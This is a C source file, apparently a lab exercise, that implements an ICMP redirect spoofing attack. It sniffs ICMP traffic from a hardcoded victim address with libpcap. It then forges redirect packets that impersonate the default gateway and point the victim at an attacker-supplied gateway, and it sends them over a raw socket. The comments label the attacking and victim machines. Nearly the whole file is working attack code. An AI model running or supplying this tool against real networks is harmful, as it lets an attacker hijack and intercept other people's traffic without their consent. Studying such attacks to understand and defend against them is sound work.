#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>  //socket()
#include<sys/types.h>
#include<netinet/ip.h>
#include<netinet/ip_icmp.h> //struct icmp
#include<arpa/inet.h> //int inet_aton(const char *string, struct in_addr*addr);
#include<unistd.h>  //close() sleep()
#include<pcap.h>
#include <errno.h>
#include <signal.h>
#include <netinet/in.h>
#include <linux/tcp.h>
#include<string.h>


#define MAXSIZE 1500
#define PROMISC 0
#define TO_MS 3

int sockfd;
static unsigned short seq=0;

struct sockaddr_in default_gateway; //原默认网关
struct sockaddr_in pesudo;  //攻击机
struct sockaddr_in target;  //受害机

struct icmp_redir {
	u_char	icmp_type;		/* type of message, see below */
	u_char	icmp_code;		/* type sub code */
    u_short	icmp_cksum;		/* ones complement cksum of struct */
    struct in_addr ih_gwaddr;	/* ICMP_REDIRECT */
    u_char *porigin;
};

struct packet{
    struct ip ip; 
    struct icmphdr icmp;
    u_char icmp_ip_data[20];
    u_char icmp_origin_data[8];
};


struct packet *pk = NULL;
u_char buff[56] = {0}; //56-28+8=36

unsigned short in_cksum(unsigned short *addr, int len); //计算检验和
void callback(u_char *user, const struct pcap_pkthdr *header, const u_char *packet);    //回调函数
void create_header(struct packet *pk);  //构造包头
void run_pcap(pcap_t **handle,struct bpf_program *fp);  //嗅探函数

int main(int argc, char ** argv){

    pk=(struct packet*)buff;
    //memset(pk,0,36);
    printf("包大小：%ld\n",sizeof(struct packet));
    
    create_header(pk);
    
    if(argc != 3){
		printf("usage: %s pesudoip pingip\n", argv[0]);
		exit(1);
	}
	
	if(inet_aton(argv[1],&pesudo.sin_addr) == 0){
		printf("bad ip address:%s\n",argv[1]);
		exit(1);
	}

	if(inet_aton(argv[2],&default_gateway.sin_addr) == 0){
		printf("bad ip address:%s\n", argv[2]);
		exit(1);
    }
    
    
    //生成一个ICMP原始包，自己仅填充ICMP部分，构造ping包，IP头部部分由系统生成
    if((sockfd=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0)
	{	perror("socket error!");exit(1);	}

    pcap_t *handle = NULL;
    struct bpf_program fp ;
    run_pcap(&handle,&fp);
   // printf("yes\n");
    pcap_freecode(&fp);
	pcap_close(handle);
	close(sockfd);
	return 0;

}
void run_pcap(pcap_t **handle,struct bpf_program *fp){
    
    
    bpf_u_int32 ip;  
	bpf_u_int32 mask;
    char *dev = NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *ip_exp = "ip and icmp and src host 192.168.1.113";
    const u_char *packet;
	struct pcap_pkthdr header;
   // printf("\n");
    *handle = pcap_open_live(dev, MAXSIZE, PROMISC, TO_MS, errbuf);
   if(*handle == NULL){
       printf("Couldn't open device%s: %s\n", dev, errbuf);
   }

	printf("%s\n",ip_exp);
  
	if(pcap_compile(*handle, fp, ip_exp, 0, mask) == -1){
		printf("Couldn't parse filte %s : %s\n", ip_exp, errbuf);
    }
    else printf("compile successfully\n");
    pcap_setfilter(*handle, fp); 
	pcap_loop(*handle, -1, callback,NULL);  //int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)	
	

}
void create_header(struct packet *pk){
    //填ip包
    pk->ip.ip_v = 4;
	pk->ip.ip_hl = 5;
	pk->ip.ip_tos = 0;
	pk->ip.ip_len = htons(56); //ip包总长度56
	pk->ip.ip_id = htons(8);
	pk->ip.ip_off = htons(0);
	pk->ip.ip_ttl = 65;
	pk->ip.ip_p = IPPROTO_ICMP;
    pk->ip.ip_sum = 0;


    //填icmp重定向包
    pk->icmp.type = ICMP_REDIRECT;
	pk->icmp.code = ICMP_REDIRECT_HOST;
	pk->icmp.checksum = 0;

     
}
static int num=0;
void callback(u_char *user, const struct pcap_pkthdr *header, const u_char *packet){
    
    u_char *p=(u_char*) packet; 
    p+=16;
    memcpy(pk->icmp_ip_data,p,20);
    
    struct ip *recv_ip =(struct ip *) p;
    //指定受害机ip地址
    pk->ip.ip_dst.s_addr= recv_ip->ip_src.s_addr;
    target.sin_addr.s_addr = recv_ip->ip_src.s_addr;
    printf("%s\n", inet_ntoa(recv_ip->ip_src));;
    //将源ip地址
    //设为默认网关ip地址
    pk->ip.ip_src.s_addr= default_gateway.sin_addr.s_addr; 
    printf("%s\n", inet_ntoa(pk->ip.ip_src));
    
    p=(u_char*) packet; 
    p+=36;
    
    memcpy(pk->icmp_origin_data,p,8);
    pk->icmp.un.gateway = pesudo.sin_addr.s_addr; 
   // printf("%s\n", inet_ntoa(pk->icmp.un.gateway));
    printf("%d\n",pk->icmp.type);
    pk->icmp.checksum = 0;
    pk->icmp.checksum=in_cksum((unsigned short*)&(pk->icmp),36);//重定向包长度36bytes
    printf("%04x\n",pk->icmp.checksum);
    
    /*
    sendto(),无连接发送
    */
    sendto(sockfd,pk,56,0,(struct sockaddr *)&target,sizeof(target));
	printf("%d\n",num++); 


}



unsigned short in_cksum(unsigned short *addr, int len) 
{ 
        int sum=0; 
        unsigned short res=0; 
        while( len > 1)  { 
                sum += *addr++; 
                len -=2;
	//	printf("sum is %x.\n",sum); 
        } 
        if( len == 1) { 
                *((unsigned char *)(&res))=*((unsigned char *)addr); 
                sum += res; 
        } 
        sum = (sum >>16) + (sum & 0xffff); 
        sum += (sum >>16) ; 
        res = ~sum; 
        return res; 
} 
/*
struct icmphdr
{
    u8 type;
    u8 code;
    u16 checksum;
    union
    {
        struct
        {
            u16 id;
            u16 sequence;
        }echo;
        
        u32 gateway;
        struct
        {
            u16 unused;
            u16 mtu;
        }frag; //pmtu发现
    }un;
    
    //u32  icmp_timestamp[2];//时间戳
    //ICMP数据占位符
    u8 data[0];
#define icmp_id un.echo.id
#define icmp_seq un.echo.sequence
};
*/